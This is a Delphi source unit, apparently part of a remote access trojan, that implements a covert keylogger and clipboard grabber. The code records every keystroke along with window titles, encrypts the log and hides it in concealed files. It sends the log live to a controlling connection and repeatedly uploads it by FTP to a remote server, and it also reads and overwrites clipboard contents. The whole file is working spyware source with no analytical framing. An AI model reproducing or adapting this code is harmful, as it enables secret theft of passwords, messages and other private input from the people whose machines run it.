unit UnitKeyboardInputs;

interface

uses
  Windows, UnitConstants, UnitFunctions, UnitVariables, UnitStringEncryption,
  ShellAPI, UnitConfiguration, uftp, UnitConnection;

var
  KeyloggerThread: THandle;

procedure StartOnlineKeylogger;  
procedure SendFTPKeylogs;
procedure StartOfflineKeylogger;
procedure StopOfflineKeylogger;
function GetClipboardFiles(var TmpStr: widestring): Boolean;
function GetClipboardText(Wnd: HWND; var TmpStr: widestring): Boolean;
procedure SetClipboardText(Const S: widestring);

implementation

var
  KeylogFile: string;
  TmpStr, OldCaption, NewCaption: string;
  ActiveOfflineKeylogger: Boolean;
  TimerHandle: Word;
        
procedure ReadKey;
var
  iByte : byte;
begin
  for iByte := 8 To 222 do
  begin
    if GetAsyncKeyState(iByte) = -32767 then
    begin
      case iByte of
        8: Delete(TmpStr, Length(TmpStr), 1); //Backspace
        9: TmpStr := TmpStr + ' [Tab] ';
        13: TmpStr := TmpStr + #13#10; //Enter
        17: TmpStr := TmpStr + ' [Ctrl] ';
        19: TmpStr := TmpStr + ' [Pause/Break] ';
        27: TmpStr := TmpStr + ' [Esc] ';
        32: TmpStr := TmpStr + ' '; //Space
        33: TmpStr := TmpStr + ' [Page Up] ';
        34: TmpStr := TmpStr + ' [Page Down] ';
        35: TmpStr := TmpStr + ' [End] ';
        36: TmpStr := TmpStr + ' [Home] ';
        37: TmpStr := TmpStr + ' [Left] ';
        38: TmpStr := TmpStr + ' [Up] ';
        39: TmpStr := TmpStr + ' [Right] ';
        40: TmpStr := TmpStr + ' [Down] ';
        44: TmpStr := TmpStr + ' [Print Screen] ';
        45: TmpStr := TmpStr + ' [Insert] ';
        46: TmpStr := TmpStr + ' [Delete] ';
        91: TmpStr := TmpStr + ' [Left start] ';
        92: TmpStr := TmpStr + ' [Right start] ';
        144: TmpStr := TmpStr + ' [Num lock] ';
        145: TmpStr := TmpStr + ' [Scroll Lock] ';
        162: TmpStr := TmpStr + ' [Left ctrl] ';
        163: TmpStr := TmpStr + ' [Right start] ';
        164: TmpStr := TmpStr + ' [Alt] ';
        165: TmpStr := TmpStr + ' [Alt grl] ';

        //Number 1234567890 Symbol !@#$%^&*()
        48: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +')' else TmpStr := TmpStr + '0';
        49: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'!' else TmpStr := TmpStr + '1';
        50: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'@' else TmpStr := TmpStr + '2';
        51: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'#' else TmpStr := TmpStr + '3';
        52: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'$' else TmpStr := TmpStr + '4';
        53: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'%' else TmpStr := TmpStr + '5';
        54: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'^' else TmpStr := TmpStr + '6';
        55: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'&' else TmpStr := TmpStr + '7';
        56: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'*' else TmpStr := TmpStr + '8';
        57: if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr +'(' else TmpStr := TmpStr + '9';

        // a..z , A..Z
        65..90: begin
                  if ((GetKeyState(VK_CAPITAL)) = 1) then
                  begin
                    if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr + LowerString(Chr(iByte)) else //a..z
                    TmpStr := TmpStr + UpperString(Chr(iByte)) //A..Z
                  end
                  else
                  begin
                    if GetKeyState(VK_SHIFT) < 0 then TmpStr := TmpStr + UpperString(Chr(iByte)) else //A..Z
                    TmpStr := TmpStr + LowerString(Chr(iByte)); //a..z
                  end;
                end;

        96..105: TmpStr := TmpStr + InttoStr(iByte - 96); //Numpad  0..9
        106: TmpStr := TmpStr + '*';
        107: TmpStr := TmpStr + '&';
        109: TmpStr := TmpStr + '-';
        110: TmpStr := TmpStr + '.';
        111: TmpStr := TmpStr + '/';

        112..123: TmpStr := TmpStr + '[F' + IntToStr(iByte - 111) + ']'; //F1-F12

        186: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + ':' else TmpStr := TmpStr + ';';
        187: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '+' else TmpStr := TmpStr + '=';
        188: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '<' else TmpStr := TmpStr + ',';
        189: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '_' else TmpStr := TmpStr + '-';
        190: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '>' else TmpStr := TmpStr + '.';
        191: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '?' else TmpStr := TmpStr + '/';
        192: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '~' else TmpStr := TmpStr + '`';
        219: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '{' else TmpStr := TmpStr + '[';
        220: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '|' else TmpStr := TmpStr + '\';
        221: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '}' else TmpStr := TmpStr + ']';
        222: if GetKeyState(VK_SHIFT)<0 then TmpStr := TmpStr + '"' else TmpStr := TmpStr + '''';
      end;
    end;
  end;
end;
    
procedure SaveLog;
var
  TmpLog: string;
begin
  TmpLog := '[' + MyGetTime(':') + '] ' + NewCaption + #13#10 + TmpStr + #13#10#13#10;
  TmpLog := EnDecryptString(TmpLog, PROGRAMPASSWORD);
  WriteTextFile(KeylogFile, TmpLog);
  TmpStr := '';
end;

procedure LogKey;
begin
  ReadKey;
end;

procedure LogKeyTimer;
begin
  TimerHandle := SetTimer(0, 0, 1, @LogKey);
end;

procedure LogCaption;
begin
  if ActiveOfflineKeylogger then
  begin
    NewCaption := ActiveCaption;
    if OldCaption <> NewCaption then SaveLog;
    OldCaption := NewCaption;
  end;
end;

procedure LogCaptionTimer;
begin
  TimerHandle := SetTimer(0, 0, 20, @LogCaption);
end;

procedure StartOfflineKeylogger;
var
  LogDir: string;
begin
  ActiveOfflineKeylogger := True;
  
  LogDir := KeylogsPath + '\' + MyGetMonth;
  if not DirectoryExists(LogDir) then
  begin
    CreateDirectory(PChar(LogDir), nil);
    HideFileName(KeylogsPath);
  end;

  KeylogFile := LogDir + '\' + MyGetDate('-');
  if not FileExists(KeylogFile) then
  begin
    CreateTextFile(KeylogFile, '');
    SetFileAttributes(PChar(KeylogFile), FILE_ATTRIBUTE_HIDDEN);
  end;

  LogCaptionTimer;
  LogKeyTimer;

  if _FTPLogs = True then StartThread(@SendFTPKeylogs);
end;

procedure StopOfflineKeylogger;
begin
  ActiveOfflineKeylogger := False;
  KillTimer(TimerHandle, 0);
end;

procedure StartOnlineKeylogger;
var
  TmpStr: string;
begin
  SendDatas(MainConnection, KEYLOGGER + '|' + KEYLOGGERLIVESTART + '|');

  while True do
  begin
    ProcessMessages;
    TmpStr := LoadTextFile(KeylogFile);
    TmpStr := EnDecryptString(TmpStr, PROGRAMPASSWORD);
    SendDatas(MainConnection, KEYLOGGER + '|' + KEYLOGGERLIVETEXT + '|' + TmpStr);
  end;
end;

procedure SendFTPKeylogs;
var
  FtpAccess: tFtpAccess;
begin
  while True do
  begin
    FtpAccess := tFtpAccess.create(_FtpOptions[0], _FtpOptions[1],
      _FtpOptions[2], _FTPPort);

    if (not Assigned(FTpAccess)) or (not FTpAccess.connected) then
    begin
      FTpAccess.Free;
      Exit;
    end;

    if FTpAccess.SetDir('./' + _FtpOptions[3]) = False then
    begin
      FTpAccess.Free;
      Exit;
    end;

    if FTpAccess.PutFile(KeylogFile, ExtractFileName(KeylogFile)) = False then
    begin
      FTpAccess.Free;
      Exit;
    end;

    FTpAccess.Free;
    Sleep(_FTPDelay);
  end;
end;

function GetClipboardFiles(var TmpStr: widestring): Boolean;
var
  f: THandle;
  buffer: Array [0..MAX_PATH * 2] of WideChar;
  i, numFiles: Integer;
begin
  Result := FALSE;
  TmpStr := '';
  OpenClipboard(0);
  try
    f := GetClipboardData(CF_HDROP);
    If f <> 0 then
    begin
      numFiles := DragQueryFileW(f, $FFFFFFFF, nil, 0);
      TmpStr := '';
      for i:= 0 to numfiles - 1 do
      begin
        buffer[0] := #0;
        DragQueryFileW(f, i, buffer, sizeof(buffer));
        TmpStr := TmpStr + widestring(buffer) + '|';
      end;
      Result := TRUE;
    end;
  finally
    CloseClipboard;
  end;
end;

function GetClipboardText(Wnd: HWND; var TmpStr: widestring): Boolean;
var
  hData: HGlobal;
  Arr: array of WideChar;
  p: pointer;
  i: int64;
begin
  Result := True;
  TmpStr := '';
  if OpenClipboard(Wnd) then
  begin
    try
      hData := GetClipboardData(CF_UNICODETEXT{CF_TEXT});
      if hData <> 0 then
      begin
        try
          p := GlobalLock(hData);
          i := GlobalSize(hData);
          setlength(Arr, i);
          CopyMemory(@Arr[0], p, i);
          TmpStr := WideString(Arr);
        finally
          GlobalUnlock(hData);
        end;
      end
      else
        Result := False;
    finally
      CloseClipboard;
    end;
  end
  else
    Result := False;
end;

procedure SetClipboardText(Const S: widestring);
var
  Data: THandle;
  DataPtr: Pointer;
  Size: integer;
begin
  Size := length(S);
  OpenClipboard(0);
  try
    Data := GlobalAlloc(GMEM_MOVEABLE + GMEM_DDESHARE, (Size * 2) + 2);
    try
      DataPtr := GlobalLock(Data);
      try
        Move(S[1], DataPtr^, Size * 2);
        SetClipboardData(CF_UNICODETEXT{CF_TEXT}, Data);
      finally
        GlobalUnlock(Data);
      end;
    except
      GlobalFree(Data);
      raise;
    end;
  finally
    CloseClipboard;
  end;
end;
end.
